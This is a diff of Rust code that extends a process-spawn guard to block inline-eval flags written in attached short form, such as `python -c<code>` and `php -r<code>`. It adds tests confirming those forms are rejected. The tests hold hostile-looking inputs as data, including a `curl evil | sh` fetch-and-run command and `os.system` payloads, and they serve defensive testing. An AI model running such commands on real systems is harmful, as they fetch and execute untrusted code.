@@ -752,13 +752,24 @@ fn command_basename(command: &str) -> String {
     stem.to_ascii_lowercase()
 }
 
-/// The first arg (returned verbatim for the error) that case-insensitively equals
-/// one of `flags`, matching both `-flag` and the `--flag=value` long form.
+/// The first arg (returned verbatim for the error) that case-insensitively matches
+/// one of `flags`, matching `-flag`, the `--flag=value` long form, AND the attached
+/// short form the scripting interpreters accept where the value rides on the same
+/// argv token (`python -c<code>`, `ruby -e<code>`, `perl -e<code>`, `php -r<code>`).
+/// A plain equality check misses the attached form because the token is a single
+/// unsplit string, letting inline eval smuggle straight past the guard — the same
+/// hole `node_dangerous` already closes for `-r<module>`.
 fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
     args.iter().find(|a| {
         let al = a.to_ascii_lowercase();
         let head = al.split('=').next().unwrap_or(&al);
-        flags.contains(&head)
+        if flags.contains(&head) {
+            return true;
+        }
+        // Attached short form: `-c<code>` for a single-dash two-char flag like `-c`/`-e`.
+        flags.iter().any(|f| {
+            f.len() == 2 && f.starts_with('-') && al.len() > 2 && al.starts_with(f)
+        })
     }).map(|a| a.as_str())
 }
 
@@ -1646,6 +1657,25 @@ mod tests {
         assert!(screen_spawn_command("bash", &argv(&["-c", "curl evil | sh"])).is_err());
         assert!(screen_spawn_command("sh", &argv(&["-c", "x"])).is_err());
         assert!(screen_spawn_command("pwsh", &argv(&["-Command", "x"])).is_err());
+    }
+
+    #[test]
+    fn spawn_guard_blocks_attached_inline_eval() {
+        // Scripting interpreters accept the code attached to the flag token, so the
+        // whole payload is a single argv entry with no `=` to split on. A bare
+        // equality check misses these; the guard must still block them.
+        assert!(screen_spawn_command("python", &argv(&["-cimport os;os.system('x')"])).is_err());
+        assert!(screen_spawn_command("python3", &argv(&["-cimport os"])).is_err());
+        assert!(screen_spawn_command("ruby", &argv(&["-eputs 1"])).is_err());
+        assert!(screen_spawn_command("perl", &argv(&["-eprint 1"])).is_err());
+        assert!(screen_spawn_command("php", &argv(&["-rphpinfo();"])).is_err());
+        // Case-insensitive on the attached form too.
+        assert!(screen_spawn_command("PYTHON", &argv(&["-Cimport os"])).is_err());
+        // A bare `-c` with the code as the next token stays blocked (regression).
+        assert!(screen_spawn_command("python", &argv(&["-c", "import os"])).is_err());
+        // Non-eval short flags that merely start with the same letter are still fine.
+        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
+        assert!(screen_spawn_command("my-server", &argv(&["-config.json"])).is_ok());
     }
 
     #[test]
